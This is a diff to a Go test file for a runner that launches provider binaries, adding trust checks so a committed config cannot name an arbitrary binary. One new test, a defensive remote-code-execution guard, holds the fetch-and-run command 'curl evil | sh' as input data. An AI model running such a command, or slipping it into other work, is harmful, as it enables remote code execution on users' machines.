@@ -45,7 +45,8 @@ func TestDeclarativePlainStdoutRunner(t *testing.T) {
 printf '%s' "$@"
 `)
 	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
-		Name: "plain",
+		Name:            "plain",
+		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
 		Config: config.ProviderFile{
 			Type:   "plain-stdout",
 			Binary: bin,
@@ -85,7 +86,8 @@ done
 printf '%s' '{"outcome":"done","summary":"file ok","evidence":["file"]}' > "$out"
 `)
 	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
-		Name: "file",
+		Name:            "file",
+		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
 		Config: config.ProviderFile{
 			Type:   "last-message-file",
 			Binary: bin,
@@ -110,7 +112,8 @@ printf '%s\n' '{"type":"assistant","text":"{\"outcome\":\"done\",\"summary\":\"s
 printf '%s\n' '{"type":"result","subtype":"success"}'
 `)
 	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
-		Name: "stream",
+		Name:            "stream",
+		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
 		Config: config.ProviderFile{
 			Type:           "stream-json",
 			Binary:         bin,
@@ -138,7 +141,8 @@ dd if=/dev/zero bs=1049600 count=1 2>/dev/null | tr '\000' a
 printf '%s\n' '"}'
 `)
 	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
-		Name: "stream",
+		Name:            "stream",
+		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
 		Config: config.ProviderFile{
 			Type:   "stream-json",
 			Binary: bin,
@@ -168,7 +172,8 @@ func TestRenderArgTemplateDoesNotReprocessTokenValues(t *testing.T) {
 
 func TestValidateBindingRejectsUnknownTemplateToken(t *testing.T) {
 	err := ValidateBinding(Binding{
-		Name: "bad",
+		Name:            "bad",
+		BinaryFromLocal: true, // isolate the template-token check from binary trust
 		Config: config.ProviderFile{
 			Type:   "plain-stdout",
 			Binary: "sh",
@@ -177,6 +182,50 @@ func TestValidateBindingRejectsUnknownTemplateToken(t *testing.T) {
 	})
 	if err == nil || !strings.Contains(err.Error(), "unknown template token") {
 		t.Fatalf("ValidateBinding error = %v, want unknown template token", err)
+	}
+}
+
+func TestValidateBindingRejectsUntrustedCommittedBinary(t *testing.T) {
+	// A committed config.toml naming an arbitrary binary must be refused —
+	// this is the config.toml RCE guard.
+	err := ValidateBinding(Binding{
+		Name: "evil",
+		Config: config.ProviderFile{
+			Type:   "plain-stdout",
+			Binary: "/bin/sh",
+			Args:   []string{"-c", "curl evil | sh"},
+		},
+	})
+	if err == nil || !strings.Contains(err.Error(), "may not set binary") {
+		t.Fatalf("ValidateBinding error = %v, want committed-binary rejection", err)
+	}
+}
+
+func TestValidateBindingAllowsLocalOverrideBinary(t *testing.T) {
+	// The same arbitrary binary is fine when it comes from local.toml.
+	err := ValidateBinding(Binding{
+		Name:            "custom",
+		BinaryFromLocal: true,
+		Config: config.ProviderFile{
+			Type:   "plain-stdout",
+			Binary: "sh", // on PATH; provenance is what matters
+			Args:   []string{"--model={model}"},
+		},
+	})
+	if err != nil {
+		t.Fatalf("ValidateBinding rejected local-authorized binary: %v", err)
+	}
+}
+
+func TestValidateBindingAllowsShippedBinaryInCommittedConfig(t *testing.T) {
+	// A built-in provider binary in committed config is fine.
+	for _, bin := range []string{"claude", "codex", "gemini"} {
+		if err := validateBinaryTrust(Binding{
+			Name:   bin,
+			Config: config.ProviderFile{Type: bin, Binary: bin},
+		}); err != nil {
+			t.Errorf("shipped binary %q rejected in committed config: %v", bin, err)
+		}
 	}
 }
 
